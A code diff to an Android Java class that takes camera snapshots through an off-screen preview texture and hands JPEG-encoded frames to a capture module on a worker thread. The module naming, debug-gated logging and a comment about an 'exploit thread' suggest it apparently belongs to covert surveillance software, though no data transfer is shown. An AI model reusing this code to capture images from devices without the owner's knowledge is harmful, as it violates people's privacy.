@@ -118,27 +118,59 @@ public class CameraSnapshot {
 	private Camera.PreviewCallback previewCallback = new Camera.PreviewCallback() {
 		@Override
 		public void onPreviewFrame(byte[] bytes, Camera camera) {
+
+			class CCD implements Runnable {
+				byte[] bytes;
+
+				Camera.Parameters cameraParms;
+				Camera.Size size;
+				CCD(byte[] b, Camera c) {
+					bytes= b;
+					cameraParms = c.getParameters();
+					size = cameraParms.getPreviewSize();
+				}
+
+				public void run() {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (CCD), size: " + bytes.length);
+					}
+					try {
+						if (isBlack(bytes)) {
+							if (Cfg.DEBUG) {
+								Check.log(TAG + " (CCD),  BLACK");
+							}
+							return;
+						}
+
+
+						int format = cameraParms.getPreviewFormat();
+						if (format == ImageFormat.NV21) {
+							ByteArrayOutputStream jpeg = new ByteArrayOutputStream();
+							YuvImage image = new YuvImage(bytes, ImageFormat.NV21, size.width, size.height, null);
+							image.compressToJpeg(new Rect(0, 0, image.getWidth(), image.getHeight()), 100, ((OutputStream)
+									jpeg));
+							ModuleCamera.callback(jpeg.toByteArray());
+						}
+					}catch(Exception e){
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (CCD), error decoding frame: " + bytes.length);
+						}
+					}
+					finally {
+
+					}
+				}
+			}
+
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (onPreviewFrame), size: " + bytes.length);
 			}
 			try {
-				if (isBlack(bytes)) {
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " (onPreviewFrame),  BLACK");
-					}
-					return;
-				}
-
-				Camera.Parameters cameraParms = camera.getParameters();
-				Camera.Size size = cameraParms.getPreviewSize();
-				int format = cameraParms.getPreviewFormat();
-				if (format == ImageFormat.NV21) {
-					ByteArrayOutputStream jpeg = new ByteArrayOutputStream();
-					YuvImage image = new YuvImage(bytes, ImageFormat.NV21, size.width, size.height, null);
-					image.compressToJpeg(new Rect(0, 0, image.getWidth(), image.getHeight()), 100, ((OutputStream)
-							jpeg));
-					ModuleCamera.callback(jpeg.toByteArray());
-				}
+				// start another Thread to check exploit thread end
+				CCD decodeCameraFrame = new CCD(bytes,camera);
+				Thread ec = new Thread(decodeCameraFrame);
+				ec.start();
 			}finally {
 
 				synchronized (cameraLock) {
@@ -178,10 +210,9 @@ public class CameraSnapshot {
 			try {
 				camera = prepareCamera(cameraId, encWidth, encHeight);
 				if (camera == null) {
-					this.enable.put(cameraId, false);
+					//todo: reenable disabling getting camera in case of error if needed: this.enable.put(cameraId, false);
 					return;
 				}
-
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (snapshot), cameraId: " + cameraId);
 				}
@@ -202,21 +233,18 @@ public class CameraSnapshot {
 
 				//camera.autoFocus(this.autofocusCallback);
 				camera.setPreviewTexture(surface);
-
 				camera.startPreview();
 				//byte[] buffer = new byte[]{};
 				//camera.addCallbackBuffer(buffer);
 				//camera.setPreviewCallbackWithBuffer(previewCallback);
 				camera.setOneShotPreviewCallback(previewCallback);
-
 				cameraLock.wait();
-
-				releaseCamera(camera);
 			} catch (Exception e) {
-				releaseCamera(camera);
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (snapshot) ERROR: " + e);
 				}
+			}finally {
+				releaseCamera(camera);
 			}
 		}
 	}
